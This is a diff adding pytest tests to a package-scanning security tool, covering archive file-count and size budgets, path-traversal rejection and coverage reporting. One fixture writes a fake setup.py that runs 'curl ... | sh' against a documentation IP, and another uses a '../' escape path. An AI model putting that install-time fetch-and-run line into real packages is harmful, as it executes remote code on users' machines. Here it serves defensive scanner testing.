@@ -267,3 +267,59 @@ def test_archive_directory_entries_are_allowed_but_links_are_not(tmp_path):
     escape.type = tarfile.DIRTYPE
     with pytest.raises(ValueError, match="unsafe path or link"):
         _safe_archive_files(build("escape.tgz", [(escape, None)]))
+
+
+def _tar_with(tmp_path, members: list[tuple[str, bytes]], name: str = "big.tgz") -> Path:
+    path = tmp_path / name
+    with tarfile.open(path, "w:gz") as archive:
+        for member_name, data in members:
+            info = tarfile.TarInfo(member_name)
+            info.size = len(data)
+            archive.addfile(info, io.BytesIO(data))
+    return path
+
+
+def test_large_archives_are_read_within_budget_install_files_first(tmp_path, monkeypatch):
+    """Fast Lane runs failed on omnibase_core/boto3-stubs-full ("too many files")."""
+    monkeypatch.setattr(artifact_fleet, "MAX_ARCHIVE_FILES", 5)
+    members = [(f"package/stubs/m{i}.pyi", b"x = 1\n") for i in range(20)]
+    members.append(("package/setup.py", b"import os\nos.system('curl https://203.0.113.9/x | sh')\n"))
+    path = _tar_with(tmp_path, members)
+    from secopsai.research_intake import ArtifactResourceLimitError
+
+    with pytest.raises(ArtifactResourceLimitError, match="too many files"):
+        artifact_fleet._safe_archive_files(path)  # strict callers keep the hard limit
+    coverage: dict = {}
+    files, metadata, _digest = artifact_fleet._safe_archive_files(path, coverage=coverage)
+    assert "package/setup.py" in files, "install-time files are read before the budget runs out"
+    assert coverage["partial"] is True and coverage["reason"] == "file-count budget reached"
+    assert (coverage["members_total"], coverage["members_read"], coverage["members_skipped"]) == (21, 5, 16)
+    assert sum(1 for item in metadata if item.get("skipped")) == 16
+
+
+def test_expanded_size_budget_reads_large_members_up_to_the_file_limit(tmp_path, monkeypatch):
+    """duckdb/fno/workerd failed with "expanded artifact exceeds the safety limit"."""
+    monkeypatch.setattr(artifact_fleet, "MAX_FILE_BYTES", 1024)
+    monkeypatch.setattr(artifact_fleet, "MAX_ARCHIVE_BYTES", 10_000)
+    path = _tar_with(tmp_path, [("package/package.json", b'{"name":"x"}'), ("package/bin/engine", b"\x7fELF" + b"\0" * 50_000)])
+    coverage: dict = {}
+    files, metadata, _digest = artifact_fleet._safe_archive_files(path, coverage=coverage)
+    assert "package/package.json" in files
+    assert coverage["partial"] is True
+    engine = next(item for item in metadata if item["path"] == "package/bin/engine")
+    assert engine["truncated"] is True and engine["size"] == 50_004
+
+
+def test_unsafe_paths_still_stop_a_budgeted_scan(tmp_path):
+    from secopsai.research_intake import UnsafeArchiveError
+
+    path = _tar_with(tmp_path, [("../escape.sh", b"echo")])
+    with pytest.raises(UnsafeArchiveError):
+        artifact_fleet._safe_archive_files(path, coverage={})
+
+
+def test_scan_artifact_reports_complete_coverage_for_small_archives(tmp_path):
+    path = _tar_with(tmp_path, [("package/index.js", b"module.exports = 1;\n")], "small.tgz")
+    result = artifact_fleet.scan_artifact(ecosystem="npm", package="small", version="1.0.0", artifact=path, db_path=tmp_path / "a.db")
+    assert result["coverage"]["partial"] is False
+    assert result["coverage"]["members_read"] == result["coverage"]["members_total"] == 1
